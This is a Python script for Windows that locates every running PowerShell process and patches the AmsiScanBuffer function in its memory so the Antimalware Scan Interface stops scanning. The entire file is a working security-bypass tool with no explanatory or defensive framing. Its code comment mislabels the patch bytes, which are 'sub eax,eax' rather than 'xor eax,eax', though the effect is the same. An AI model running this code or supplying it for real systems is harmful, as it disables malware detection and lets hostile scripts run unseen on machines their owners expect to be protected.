#!/usr/bin/env python3

from ctypes import *
import psutil
import sys

KERNEL32 = windll.kernel32
PROCESS_ACCESS = (
    0x000F0000 | 0x00100000 | 0xFFFF  # STANDARD_RIGHTS_REQUIRED  # SYNCHRONIZE
)
PAGE_READWRITE = 0x40

def gePowershellPids():
    ppids = [
        pid
        for pid in psutil.pids()
        if psutil.Process(pid).name() == "powershell.exe"
    ]
    return ppids

def writeBuffer(handle, address, buffer):
    nBytes = c_int(0)
    KERNEL32.WriteProcessMemory.argtypes = [
        c_ulong,
        c_void_p,
        c_void_p,
        c_ulong,
        c_void_p,
    ]
    res = KERNEL32.WriteProcessMemory(
        handle, address, buffer, len(buffer), byref(nBytes)
    )
    if not res:
        print(f"[-] WriteProcessMemory Error: {KERNEL32.GetLastError()}")
    return res

def patchAmsiScanBuffer(handle, funcAddress):
    patchPayload = b"\x29\xc0" + b"\xc3"  # xor eax,eax  # ret
    return writeBuffer(handle, funcAddress, patchPayload)

def resolve_function(dll, func):
    KERNEL32.GetModuleHandleW.argtypes = [c_wchar_p]
    KERNEL32.GetModuleHandleW.restype = c_void_p
    KERNEL32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    KERNEL32.GetProcAddress.restype = c_void_p
    handle = KERNEL32.GetModuleHandleW(dll)
    address = KERNEL32.GetProcAddress(handle, func)
    return address

for pid in gePowershellPids():
    process_handle = KERNEL32.OpenProcess(PROCESS_ACCESS, False, pid)
    if not process_handle:
        continue
    print(
        f"[+] Got process handle of powershell at {pid}: {hex(process_handle)}"
    )
    print(f"[+] Trying to find AmsiScanBuffer in {pid} process memory...")
    cdll.LoadLibrary("amsi")
    amsiDllBaseAddress = resolve_function("amsi.dll", b'AmsiScanBuffer')
    print(f"[+] AmsiScanBuffer found at {hex(amsiDllBaseAddress)}")
    if not amsiDllBaseAddress:
        print(f"[-] Error finding amsiDllBaseAddress in {pid}.")
        print(f"[-] Error: {KERNEL32.GetLastError()}")
        sys.exit(1)
    else:
        print(
            f"[+] Trying to patch AmsiScanBuffer found at {hex(amsiDllBaseAddress)}"
        )
        if not patchAmsiScanBuffer(process_handle, amsiDllBaseAddress):
            print(f"[-] Error patching AmsiScanBuffer in {pid}.")
            print(f"[-] Error: {KERNEL32.GetLastError()}")
            sys.exit(1)
        else:
            print(f"[+] Success patching AmsiScanBuffer in PID {pid}")
    KERNEL32.CloseHandle(process_handle)
    print("")
